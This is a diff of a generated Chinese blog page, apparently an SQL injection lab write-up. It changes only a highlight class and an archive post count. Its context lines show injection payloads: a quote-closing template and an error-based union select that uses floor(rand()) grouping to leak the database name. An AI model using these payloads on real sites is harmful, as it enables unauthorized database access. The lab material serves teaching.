@@ -702,7 +702,7 @@ group by x 按x对查询结果进行分组</p>
 
 <p>观察了一下是在uname和passwd的基础上两边都加’”(一个单引号一个双引号)
 故payload为 </p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'" 语句 <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'" 语句 <span class="comment">#</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="库名-1"><a href="#库名-1" class="headerlink" title="库名"></a>库名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'" union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">database</span>(),<span class="number">0x7e</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">14</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> informaition_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">#</span></span><br></pre></td></tr></table></figure>
 
@@ -1076,7 +1076,7 @@ UPDATE 表名 SET 列名 = 新值 WHERE 列名 = 表中某值</p>
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
